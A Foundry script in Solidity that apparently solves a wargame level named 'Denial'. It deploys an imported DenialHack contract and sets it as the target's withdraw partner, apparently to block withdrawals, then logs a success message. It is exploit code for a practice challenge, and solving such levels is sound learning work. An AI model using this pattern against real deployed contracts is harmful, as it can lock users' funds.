// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import {Denial} from "src/levels/Denial.sol";
import {DenialHack} from "src/hack/DenialHack.sol";

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract DenialScript is Script {
    function run() external {
        address denialAddress = vm.envAddress("DENIAL_ADDRESS");
        IDenial denial = IDenial(denialAddress);
        address attacker = vm.rememberKey(vm.envUint("TESTNET_PRIVATE_KEY_1"));

        vm.startBroadcast(attacker);
        DenialHack denialHack = new DenialHack();
        denial.setWithdrawPartner(address(denialHack));
        vm.stopBroadcast();

        console2.log("SUCCESS!!! Submit the instance.");
    }
}
